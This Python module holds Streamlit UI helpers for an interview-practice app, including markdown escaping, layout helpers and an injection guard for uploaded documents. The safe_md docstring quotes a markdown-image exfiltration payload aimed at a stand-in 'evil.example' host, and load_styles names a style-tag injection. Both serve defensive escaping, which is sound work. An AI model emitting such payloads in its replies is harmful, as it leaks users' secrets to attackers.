"""Shared UI plumbing: cached resources and small helpers used by every page.

Streamlit reruns the whole script on every click, so expensive objects (the DB engine, API clients) are
created once with st.cache_resource and reused across reruns.
"""

import re
from collections.abc import Sequence
from pathlib import Path
from typing import Final, Literal

import streamlit as st
from sqlalchemy.engine import Engine
from streamlit.delta_generator import DeltaGenerator
from streamlit.errors import StreamlitAPIException

from interview_app.config import get_settings
from interview_app.db import init_db, make_engine
from interview_app.interview.engine import EngineDeps, active_session_id
from interview_app.llm.calllog import make_db_recorder
from interview_app.llm.client import LLMClient
from interview_app.llm.decide import DecisionClient
from interview_app.llm.pricing import PriceCatalog
from interview_app.security import InjectionGuard
from interview_app.users import ensure_local_user


@st.cache_resource
def get_engine() -> Engine:
    engine = make_engine(get_settings().database_url)
    init_db(engine)
    return engine


def current_user_id() -> int:
    """Single local user for now (see interview_app/users.py)."""
    if "user_id" not in st.session_state:
        st.session_state.user_id = ensure_local_user(get_engine())
    return st.session_state.user_id


@st.cache_resource
def get_price_catalog() -> PriceCatalog:
    return PriceCatalog(get_settings())


# --- Untrusted text in markdown ------------------------------------------------------------------

# The characters that start markdown syntax: emphasis, code, links and images, raw HTML, headings, lists,
# tables, and Streamlit's own extensions `$` (LaTeX), `:red[...]` (colours) and `:material/...:` (icons).
# CommonMark renders a backslash-escaped punctuation character as itself. Escaping `:` also breaks bare
# `https://` autolinks. Harmless punctuation (`.`, `?`, `,`) stays as it is, so the text stays readable.
_MD_PUNCTUATION = re.compile(r"([\\`*_{}\[\]()<>#+\-!|~$:])")


def safe_md(text: str | None, inline: bool = False) -> str:
    """Make model or user text safe to pass to st.markdown, chat messages, labels and alerts.

    Answers, documents and model replies are untrusted (OWASP LLM01/LLM05): a reply containing
    `![](https://evil.example/?d=<secret>)` would make the browser fetch that URL (data exfiltration), a
    link could phish, and a salary like "$90k to $110k" would be typeset as LaTeX. Escaping shows the
    text exactly as written, with no formatting. `inline=True` folds line breaks into spaces, for text
    placed inside a single line (a label, a list item, italics).
    """
    text = _MD_PUNCTUATION.sub(r"\\\1", text or "")
    if inline:
        return " ".join(text.split())
    # Markdown joins single line breaks into one paragraph; two trailing spaces keep the user's breaks.
    return text.replace("\n", "  \n")


def short(text: str | None, limit: int = 90) -> str:
    """Shorten text for a label, cutting at a word boundary so no word is chopped in half."""
    text = " ".join((text or "").split())
    if len(text) <= limit:
        return text
    cut = text[:limit].rsplit(" ", 1)[0] or text[:limit]
    return cut.rstrip(",;:.-—") + "…"


# Chat avatars: neutral icons for both speakers. Streamlit's default user avatar is red, which in this
# app reads as "error" or "weak score".
INTERVIEWER_AVATAR = ":material/person:"
CANDIDATE_AVATAR = ":material/account_circle:"


def page_link(page: str, label: str, icon: str | None = None) -> None:
    """st.page_link, falling back to plain text when the page runs on its own (tests run one page
    file without main.py's st.navigation, and then Streamlit can't resolve the page path)."""
    try:
        st.page_link(page, label=label, icon=icon)
    except StreamlitAPIException:
        st.caption(label)


def go_button(
    page: str,
    label: str,
    icon: str | None = None,
    key: str | None = None,
    primary: bool = True,
    state: dict | None = None,
    link: bool = False,
) -> None:
    """A button that opens another page, for a call to action that must stand out (a page link looks
    like plain navigation). `state` is written to session_state first, e.g. which interview to open.
    `link=True` draws it borderless like a link, for a pointer inside a line of text that needs `state`
    (st.page_link can't set any)."""
    kind = "tertiary" if link else "primary" if primary else "secondary"
    if st.button(label, icon=icon, key=key, type=kind):
        for name, value in (state or {}).items():
            st.session_state[name] = value
        try:
            st.switch_page(page)
        except StreamlitAPIException:
            st.caption(label)  # a page run on its own (tests) has no navigation to switch with


def slider_start(questions: int) -> int:
    """A saved or usual question count clamped into the slider's range (Limits), so a value saved
    before the range was changed in .env can't make st.slider raise."""
    limits = get_settings().limits
    return min(max(questions, limits.min_main_questions), limits.max_main_questions)


def kept_widget(widget, key: str, default, *args, **kwargs):
    """Draw a widget whose value survives runs in which it isn't drawn (a hidden section, a slider that
    only shows for one interview type).

    Streamlit drops a widget's state in any run where the widget isn't drawn, so its value would reset.
    A shadow copy under another key (not a widget key, so Streamlit keeps it) seeds the widget the next
    time it is drawn. The widget gets no default of its own: giving both a default and a session_state
    value makes Streamlit warn.
    """
    shadow = f"kept_{key}"
    if key not in st.session_state:
        st.session_state[key] = st.session_state.get(shadow, default)
    value = widget(*args, key=key, **kwargs)
    st.session_state[shadow] = value
    return value


# --- Design system: one stylesheet and layout helpers ---------------------------------------------
#
# The helpers give their containers keys with fixed prefixes (ih-cards-, ih-card-, ih-foot-, ih-panel-,
# ih-form-, ih-buttons-). Streamlit turns a container key into the CSS class "st-key-<key>", and
# app/styles/app.css styles those classes only. A `key` passed to a helper must be unique on the page and
# should be a short slug (letters, digits, dashes), because it becomes part of a CSS class name.

STYLESHEET: Final = Path(__file__).parent / "styles" / "app.css"


def load_styles() -> None:
    """Inject the app stylesheet (app/styles/app.css). Call it once per run, before drawing (main.py does).

    It takes no arguments on purpose: the stylesheet is a static file, and st.html gets its Path, so no user,
    document or model text can ever reach the CSS (an injected `</style><img src=...>` would be an XSS and
    exfiltration hole). Streamlit wraps a .css file in <style> tags and, because the result is only a style
    tag, puts it where it takes no space on the page.
    """
    st.html(STYLESHEET)


def sentence_case(label: str) -> str:
    """Upper-case only the first letter: "job description" -> "Job description", "CV" stays "CV"
    (str.capitalize would turn it into "Cv")."""
    return label[:1].upper() + label[1:]


def card_row(
    count: int, *, key: str, per_row: int = 3, highlight: int | None = None, gap: str = "medium"
) -> list[DeltaGenerator]:
    """Bordered cards laid out in rows; the cards in each row share one height.

    Returns `count` containers to fill with `with card:`. Cards are placed `per_row` to a row (a short last
    row keeps the same card width instead of stretching), and on a narrow screen Streamlit stacks the
    columns. Put the part that should line up across cards (a status, a score, a button) in
    `card_footer()` as the card's last element: it is pushed to the bottom of the card.

    `highlight` is the index of one card to mark with an accent bar (e.g. the current step). The bar is
    decoration only: also say the state in words inside the card.

    Use for: the journey steps and application cards on Home, History's score numbers, Settings' usage.
    """
    cards: list[DeltaGenerator] = []
    for start in range(0, count, per_row):
        with st.container(key=f"ih-cards-{key}-{start // per_row}"):
            columns = st.columns(per_row, gap=gap)
        for offset, column in enumerate(columns[: count - start]):
            i = start + offset
            kind = "hl" if i == highlight else "c"
            cards.append(column.container(border=True, height="stretch", key=f"ih-card-{kind}-{key}-{i}"))
    return cards


def panel(*, key: str) -> DeltaGenerator:
    """A bordered section with the same inner padding as the cards, for one block that stands on its own
    (a call to action, a form, a summary). Use as `with panel(key="next-step"):`.

    Use for: Home's next step, the start form's sections, the interview header and coaching choice, the
    report's headline and lists, History's trend, the Settings groups.
    """
    return st.container(border=True, key=f"ih-panel-{key}")


def card_footer(*, key: str) -> DeltaGenerator:
    """The bottom section of a card from card_row(): pushed to the card's bottom edge, so the footers in
    one row line up whatever the text above them. Keep it short (one line) so the footers stay level.
    Call it inside `with card:`, after the card's main content. `key` must be unique on the page
    (e.g. f"app-{app.id}")."""
    return st.container(key=f"ih-foot-{key}")


def form_row(
    spec: int | Sequence[float],
    *,
    key: str,
    align: Literal["top", "center", "bottom"] = "bottom",
) -> list[DeltaGenerator]:
    """Columns for one row of a form grid, with the design system's column gap.

    `spec` is what st.columns takes (a count or relative widths). `align="bottom"` (default) keeps the
    input boxes level when labels differ in length; use "top" for blocks that start with a heading (a
    document's label, upload box and text box), and "center" for a caption next to a button. Rows of the
    same `spec` stack into a grid whose columns line up. On a narrow screen the columns stack.

    Use for: the Company/Role row and the document grid on Applications, the start form's and Settings' grids,
    History's filters, the report's breakdown.
    """
    with st.container(key=f"ih-form-{key}"):
        return st.columns(spec, gap="medium", vertical_alignment=align)


def button_row(*, key: str, align: Literal["start", "end"] = "start") -> DeltaGenerator:
    """A row of buttons that all get the same width (the widest label's) and height.

    Use as `with button_row(key="next"):` and draw st.button / go_button calls inside, primary action
    first. `align="end"` pushes the row to the right edge, e.g. a row's action next to its description.
    On a narrow screen the buttons stack and fill the width (easy to tap). Only buttons belong in it.

    Use for: every action row: Home's next step, Save/Save anyway/Delete, Start interview, Continue/Retry,
    the report, drill and History actions.
    """
    prefix = "ih-buttons-end" if align == "end" else "ih-buttons"
    return st.container(horizontal=True, key=f"{prefix}-{key}")


def mic_recording(label: str, *, key: str, sample_rate: int, help: str | None = None) -> bytes | None:
    """The browser mic as WAV bytes (None until something is recorded).

    A thin wrapper on purpose: AppTest can't drive st.audio_input, so UI tests replace this one function
    with a fake recorder. The bytes stay in memory only (spoken answers are never stored).
    """
    recording = st.audio_input(label, sample_rate=sample_rate, key=key, help=help)
    return recording.getvalue() if recording is not None else None


# --- Leaving a running interview -------------------------------------------------------------------


def navigation_position() -> Literal["sidebar", "hidden"]:
    """Where main.py draws the page navigation: hidden while an interview is running, so the Interview
    page's "Exit interview" dialog (save, end, discard) is the one way out of it.

    "Save & exit" in that dialog sets `paused_session`: the candidate chose to leave, so the navigation
    comes back until they resume. One small DB query per page view (active_session_id loads no turns).

    A new browser session (a reload, a new tab, a reconnect after a server restart) counts as paused too:
    session_state starts empty then, so the flag above is gone, yet the candidate isn't mid-answer. Without
    this the sidebar vanished on every reload until they resumed and saved again. Opening the Interview
    page clears the flag, so the navigation hides as soon as they are back in the interview.
    """
    running = active_session_id(get_engine(), current_user_id())
    if running is not None and "nav_seen" not in st.session_state:
        st.session_state.paused_session = running
    st.session_state.nav_seen = True
    if running is None or st.session_state.get("paused_session") == running:
        return "sidebar"
    return "hidden"


def interview_running_note(url_path: str) -> None:
    """While an interview is running, other pages show a way back to it: with the navigation hidden it is
    the only way, and in a new browser session (navigation shown, see navigation_position) it is a
    reminder. Home already offers "Resume", and the Interview page is the interview itself, so they get no
    note."""
    if url_path in ("", "interview"):
        return
    if active_session_id(get_engine(), current_user_id()) is None:
        return
    with panel(key="interview-running"):
        st.markdown("**You have an interview in progress.** Go back to it to continue, save it or end it.")
        with button_row(key="interview-running"):
            go_button("views/interview.py", "Back to the interview", icon=":material/forum:")


# Asks the browser for its own "Leave site?" prompt when the tab is closed or reloaded mid-interview. Nothing
# would be lost (every answer is stored), but closing the tab by accident is easy. Why it is built this way:
# - st.html runs the script in the page itself (not an iframe), so it can listen on `window`.
# - The listener is added once per browser tab and only acts while the marker span is in the page. Streamlit
#   removes the span on any run that doesn't draw it (the interview ended, another page is shown), so the
#   prompt stops without a second "remove the listener" script.
# - It is a fixed string: no user, document or model text ever reaches it.
_LEAVE_GUARD_HTML: Final = """<span id="ih-leave-guard" hidden></span>
<script>
if (!window.ihLeaveGuard) {
  window.ihLeaveGuard = true;
  window.addEventListener("beforeunload", (event) => {
    if (document.getElementById("ih-leave-guard")) {
      event.preventDefault();
      event.returnValue = "";
    }
  });
}
</script>"""


def leave_site_guard() -> None:
    """Draw the "Leave site?" guard (see _LEAVE_GUARD_HTML). Call it only while an interview is active."""
    st.html(_LEAVE_GUARD_HTML, unsafe_allow_javascript=True)


# --- Model clients ---------------------------------------------------------------------------------


@st.cache_resource
def _user_decider(user_id: int) -> DecisionClient:
    # The user-level Jev client (calls outside any interview). Cached because each DecisionClient opens
    # its own HTTP client, and engine_deps() runs on many reruns.
    return DecisionClient(get_settings(), recorder=make_db_recorder(get_engine(), user_id))


def engine_deps() -> EngineDeps:
    """Wire the interview engine to real models, the call log, pricing and the injection guard.

    Cheap to call: the factories below build a client only when the engine asks for one, bound to that
    interview session so every call is recorded against it."""
    engine, cfg, user_id = get_engine(), get_settings(), current_user_id()

    def make_llm(uid: int, session_id: int | None) -> LLMClient:
        return LLMClient(cfg, recorder=make_db_recorder(engine, uid, session_id), pricing=get_price_catalog())

    def make_decider(uid: int, session_id: int | None) -> DecisionClient:
        # Bound to the session like make_llm, so guard and live-score calls count in that interview's cost.
        return DecisionClient(cfg, recorder=make_db_recorder(engine, uid, session_id))

    decider = _user_decider(user_id)
    return EngineDeps(
        engine=engine,
        settings=cfg,
        make_llm=make_llm,
        guard=InjectionGuard(cfg, decider),
        decider=decider,
        make_decider=make_decider,
    )


@st.cache_resource
def _document_guard_for(user_id: int) -> InjectionGuard:
    # Document checks belong to no interview, so they use the user-level Jev client, and one guard per
    # user is reused across reruns.
    return InjectionGuard(get_settings(), _user_decider(user_id))


def document_guard() -> InjectionGuard:
    """Injection guard for uploaded documents (rules first, then Jev)."""
    return _document_guard_for(current_user_id())
